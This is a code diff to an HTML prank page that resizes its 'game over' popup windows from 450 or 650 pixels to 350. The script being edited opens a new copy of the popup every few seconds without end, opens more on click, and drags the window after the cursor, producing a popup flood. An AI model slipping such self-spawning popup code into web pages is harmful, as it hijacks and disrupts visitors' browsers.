@@ -7,8 +7,8 @@
         body {
             margin: 0;
             padding: 0;
-            width: 450px;
-            height: 450px;
+            width: 350px;
+            height: 350px;
             background-image: url('assets/game-over.gif');
             background-size: cover;
             background-position: center;
@@ -23,8 +23,8 @@
     </audio>
     
     <script>
-        let x = Math.random() * (screen.availWidth - 450);
-        let y = Math.random() * (screen.availHeight - 450);
+        let x = Math.random() * (screen.availWidth - 350);
+        let y = Math.random() * (screen.availHeight - 350);
         let vx = (Math.random() - 0.5) * 10;
         let vy = (Math.random() - 0.5) * 10;
         let stuckToCursor = false;
@@ -56,14 +56,14 @@
         
         function createNewPopup() {
             setTimeout(() => {
-                window.open('popup.html', 'popup_' + Date.now(), 'width=450,height=450,resizable=no,scrollbars=no,toolbar=no');
+                window.open('popup.html', 'popup_' + Date.now(), 'width=350,height=350,resizable=no,scrollbars=no,toolbar=no');
                 createNewPopup();
             }, Math.random() * 2000 + 4000);
         }
         
         document.addEventListener('mousemove', function(e) {
             if (stuckToCursor) {
-                window.moveTo(e.screenX - 325, e.screenY - 325);
+                window.moveTo(e.screenX - 175, e.screenY - 175);
             }
         });
 
@@ -76,7 +76,7 @@
         });
         
         document.body.addEventListener('click', function() {
-            window.open('popup.html', 'popup_' + Date.now(), 'width=650,height=650,resizable=no,scrollbars=no,toolbar=no');
+            window.open('popup.html', 'popup_' + Date.now(), 'width=350,height=350,resizable=no,scrollbars=no,toolbar=no');
         });
         
         window.onload = function() {
@@ -87,5 +87,3 @@
     </script>
 </body>
 </html>
-
-
